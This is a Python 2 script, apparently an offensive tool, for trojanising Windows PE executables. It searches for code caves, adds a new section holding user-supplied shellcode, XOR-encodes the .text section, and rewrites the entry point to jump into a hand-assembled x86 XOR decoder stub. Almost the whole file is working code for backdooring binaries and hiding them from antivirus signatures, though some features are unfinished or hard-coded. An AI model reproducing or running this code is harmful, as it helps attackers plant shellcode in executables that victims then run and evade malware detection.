#!/usr/bin/python
# -*- coding: utf-8 -*-
# Credits:
# http://git.n0p.cc/?p=SectionDoubleP.git;a=blob;f=SectionDoubleP.py
# https://msdn.microsoft.com/en-us/library/ms809762.aspx
#
# TODO
#   - Add new section to put shellcode into
#   - Find code cave to put shellcode into
#   - XOR .text and/or .Xdata sections
#   - Fix prologue (for XOR sections)
import sys
import random
import string
import struct
import os
# Required
try: # Kind of check to ensure all modules are installed
    import pefile
    import argparse
    from pwn import disasm, asm
except:
    print "Please install the following modules to ensure %s works" % (sys.argv[0])
    print " - pefile"
    print " - argparse"
    print " - pwn"
    sys.exit(1)

# Import custom modules/functions
from f_generic import *
from f_pe import *

# Look for code cave inside PE file's sections
def find_code_cave(pe_struct, min_size=100):
    print "[*] Looking for code caves"
    for section in pe_struct.sections:
        print "\t- Section: %s" % (section.Name)
        current_size = 0
        n = 0
        current_address = ""
        for d in section.get_data():
            if d == "\x00":
                current_size += 1
                current_address = section.VirtualAddress
            else:
                if current_size >= min_size:
                    #print hex(section.PointerToRawData + n - current_size)
                    print "\t-> Found a code cave: %d bytes, starting @%s" % (current_size, hex(current_address))
                current_size = 0
                current_address = ""
            n+=1

# Hide section (.text) through a XOR routine
def hide_xor(pe_struct, prologue, prologue_offset):
    new_pe_file = create_new_section(pe_struct, sectionName=".zebi")
    iterate_trough_pe_sections(pe_struct)

    # Get latest section
    latest_section = new_pe_file.sections[-1]
    # Figure out where to JMP (relative) from EntryPoint
    jmp_addr = latest_section.VirtualAddress - new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint - 1
    # relative JMP (use call to push @ on stack)
    jmp_shellcode = b"\xE8" + struct.pack("<I", jmp_addr)
    # Find size (and index) of a specific section
    section, index = find_section(pe_struct, section_name = ".text")

    # Remove this?
    diff_start_section = 0 #(new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint - section.VirtualAddress)+5
    diff_end_section = (section.VirtualAddress + section.SizeOfRawData) - (pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)

    # Get XOR routine
    xor_routine = xor_routine_asm(diff_end_section)

    # Need to adjust for prologue
    if prologue_offset != -1:
        current_addr = latest_section.VirtualAddress + len(xor_routine)
        jmp_to = pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + prologue_offset

        print hex(current_addr)
        print hex(jmp_to)

        #xor_routine += "\xe8" + "\x46\x52\xfd\xff"

    xor_routine += "\xff\xe0" # JMP EAX

    # Change code @ entry point
    new_pe_file.set_bytes_at_rva(new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint, jmp_shellcode)
    # Update code to add XOR routine
    new_pe_file.set_bytes_at_rva(latest_section.VirtualAddress, xor_routine)

    # Make section writable
    section.Characteristics = 0xE00000E0

def figure_prologue(pe_struct):
    prologue_instruction = get_ASM_instruction(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 10)

    # Try to figure (and patch) EntryPoint instructions
    try:
        inst = prologue_instruction.split("\n")[0]
        if "call" in inst.lower():                  # Patch with relative offset
            # Fix this
            prologue = inst.split("  ")[0].replace(" ","")
            offset = 0x28f
            return prologue, offset
        else:
            prologue = inst.split("  ")[0]
            return prologue, -1
    except:
        return None, -1

def get_ASM_instruction(pe_struct, start_address, size=5, args=None):
    blob = pe_struct.get_data(start_address, size)
    return disasm(blob, arch="i386", offset=0)

# XOR a specific section
def xor_section(pe_struct, section_name, key=0xA0, offset=5):
    section, index = find_section(pe_struct, section_name)

    if section != None:
        result = ""
        # Go through all data, from Entry point to end of section
        for d in section.get_data(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + offset):
            result += chr(ord(d)^key)
        # Add XORed data @ VirtualAddress
        pe_struct.set_bytes_at_rva(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + offset, result)

# Create XOR (ASM) routine
def xor_routine_asm(end_address, prologue="", key=0xA0):
    xor_routine = "\x90\x90\x90\x90"                    # NOPs
    xor_routine += "\x58"                               # POP EAX
    xor_routine += "\x50"                               # PUSH EAX
    xor_routine += "\x89\xc5"                           # MOV EBP, EAX
    xor_routine += "\x81\xc5" + p(end_address)          # ADD EBP, {ADDR}
    xor_routine += "\x80\x30" + chr(key)                # Key for XOR routine
    xor_routine += "\x40"                               # INC EAX
    xor_routine += "\x39\xe8"                           # CMP EAX, EBP
    xor_routine += "\x0f\x8e\xf4\xff\xff\xff"           # JLE backwards
    xor_routine += "\x58"                               # POP EAX
    return xor_routine

if __name__ == "__main__":
    args = parser()

    # Load and analyse PE file
    pe_struct = load_pe_file(args.file)
    pe_quick_analysis(pe_struct)

    if (args.analyse): # Look for code cave
        pe_deeper_analysis(pe_struct)
    elif (args.fcc):
        find_code_cave(pe_struct)
    elif (args.hide):
        if args.hide == "xor":
            #xor_section(pe_struct)
            pass
    elif (args.shellcode):

        # Add shellcode to binary, through new section
        shellcode_content = open_file(args.shellcode)
        new_section_name = gen_section_name(args.new_sec_name)
        new_pe_file = create_new_section(pe_struct, sectionName=new_section_name)

        if (args.verbose):
            iterate_trough_pe_sections(new_pe_file)

        write_PE_file(new_pe_file, args.output)

    elif (args.test):
        # For .text only (at the moment)

        # 1 - Find prologue (few ASM instructions)
        prologue, p_offset = figure_prologue(pe_struct)
        if prologue == None:
            print "[!] Can't figure out prologue, the program might crash at run time"

        # 2 - XOR corresponding section
        xor_section(pe_struct, ".text", offset=(len(prologue)/2))
        # 3 - Add XOR routine
        hide_xor(pe_struct, prologue, p_offset)
        # 4 - Write PE file
        write_PE_file(pe_struct, "zeubi.exe")
